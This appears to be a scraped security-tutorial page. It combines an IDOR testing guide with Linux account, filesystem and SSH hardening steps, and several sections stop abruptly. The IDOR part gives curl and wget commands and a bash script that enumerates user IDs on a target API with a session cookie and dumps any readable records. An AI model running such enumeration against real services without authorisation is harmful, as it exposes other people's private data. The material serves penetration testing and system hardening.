🔓 IDOR (Insecure Direct Object Reference) Guide

Finding and exploiting insecure object references

4.3 IDOR Testing Methodology
Step 1: Identification
Look for these patterns 
# URL Parameters
http://target.com/view?user_id=123
http://target.com/profile?id=456
http://target.com/download?file_id=789

# API Endpoints
http://target.com/api/users/123
http://target.com/api/files/456.pdf
http://target.com/api/invoices/789

# Cookie values
{"user_id": 123, "role": "user"}
{"session": "abc123", "uid": 456}

# Hidden form fields
<input type="hidden" name="userid" value="123">
<input type="hidden" name="docid" value="456">
Step 2: Testing Techniques
Manual Testing Commands 
# Using curl to test IDOR
curl -H "Cookie: session=abc123" http://target.com/api/users/123
curl -H "Cookie: session=abc123" http://target.com/api/users/124
curl -H "Cookie: session=abc123" http://target.com/api/users/125

# Using wget
wget --header="Cookie: session=abc123" http://target.com/download?file=1
wget --header="Cookie: session=abc123" http://target.com/download?file=2

# Using Burp Suite
# 1. Capture request
# 2. Send to Repeater
# 3. Change parameter values
# 4. Check response differences
Step 3: Automated Testing
Bash Script for IDOR Testing 
#!/bin/bash
# IDOR Scanner Script

URL="http://target.com/api/user"
COOKIE="session=abc123"
RANGE_START=1
RANGE_END=100

echo "[*] Starting IDOR scan..."

for i in $(seq $RANGE_START $RANGE_END); do
    echo "[*] Testing ID: $i"
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -H "Cookie: $COOKIE" "$URL/$i")
    
    if [ "$RESPONSE" == "200" ]; then
        echo "[+] Found accessible resource: $URL/$i"
        curl -s -H "Cookie: $COOKIE" "$URL/$i" | head -20
        echo ""
    elif [ "$RESPONSE" == "403" ]; then
        echo "[-] Access denied: $i"
    else
        echo "[.] Response $RESPONSE for ID: $i"
    fi
    
    sleep 0.5
done

echo "[*] Scan completed!"

System Updates

Step 2: User Account Security
User Management 
# Create new user with sudo
sudo adduser username
sudo usermod -aG sudo username

# Remove default users
sudo deluser --remove-home username

# Set password policies
sudo apt install libpam-pwquality
sudo nano /etc/pam.d/common-password
# Add: password requisite pam_pwquality.so retry=3 minlen=12 difok=3

# Set password expiration
sudo chage -M 90 username
sudo chage -W 7 username
sudo chage -I 30 username

# Lock inactive accounts
sudo useradd -D -f 30
# 30 days after password expires, account is disabled

# Check for empty passwords
sudo awk -F: '($2 == "") {print $1}' /etc/shadow

# Disable root login
sudo passwd -l root
Step 3: Filesystem Security
Filesystem Hardening 
# Set proper permissions
sudo chmod 750 /home/username
sudo chmod 600 /home/username/.ssh/authorized_keys
sudo chmod 700 /home/username/.ssh

# Find world-writable files
sudo find / -type f -perm -0002 -exec ls -l {} \; 2>/dev/null

# Find SUID/SGID files

🔐 SSH Server Hardening Guide

Secure SSH configuration to prevent unauthorized access

8.2 SSH Security Configuration
IMPORTANT: Always keep a backup SSH connection open when testing new configurations!
Step 1: Basic SSH Hardening
SSH Configuration (/etc/ssh/sshd_config) 
# Backup original config
sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.backup

# Edit SSH configuration
sudo nano /etc/ssh/sshd_config

# Change the following lines:

# Disable root login
PermitRootLogin no

# Change SSH port (optional)
Port 2222

# Allow only specific users
AllowUsers username1 username2

# Allow only specific groups
AllowGroups sshusers

# Disable password authentication (use keys)
PasswordAuthentication no

# Enable public key authentication
PubkeyAuthentication yes

# Disable empty passwords
PermitEmptyPasswords no

# Disable X11 forwarding (unless needed)
X11Forwarding no

# Disable agent forwarding
AllowAgentForwarding no

# Disable TCP forwarding
AllowTcpForwarding no

# Set maximum authentication attempts
MaxAuthTries 3

# Set login grace time
LoginGraceTime 30

# Restart SSH service
sudo systemctl restart sshd
Step 2: SSH Key Authentication Setup
SSH Key Configuration 
# On client machine, generate SSH key
ssh-keygen -t ed25519 -a 100
# or
ssh-keygen -t rsa -b 4096 -a 100

# Copy public key to server
ssh-copy-id -i ~/.ssh/id_ed25519.pub username@server_ip
# or manually copy to server's ~/.ssh/authorized_keys

# On server, secure the authorized_keys file
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

# Test SSH connection
ssh -i ~/.ssh/id_ed25519 username@server_ip -p 2222

# For extra security, add passphrase to key
ssh-keygen -p -f ~/.ssh/id_ed25519
Step 3: Advanced SSH Security
Advanced Configuration 
# Configure two-factor authentication (2FA)
sudo apt install libpam-google-authenticator

# Edit PAM configuration
sudo nano /etc/pam.d/sshd
# Add: auth required pam_google_authenticator.so

# Edit SSH configuration
sudo nano /etc/ssh/sshd_config
# Add: ChallengeResponseAuthentication yes

# Restart SSH
sudo systemctl restart sshd

# On user account, setup Google Authenticator
google-authenticator

# Set up fail2ban for SSH
sudo nano /etc/fail2ban/jail.local
# Add:
[sshd]
enabled = true
port = ssh
filter = sshd

sudo systemctl restart fail2ban

sudo tail -f /var/log/auth.log | grep sshd

# Check failed login attempts
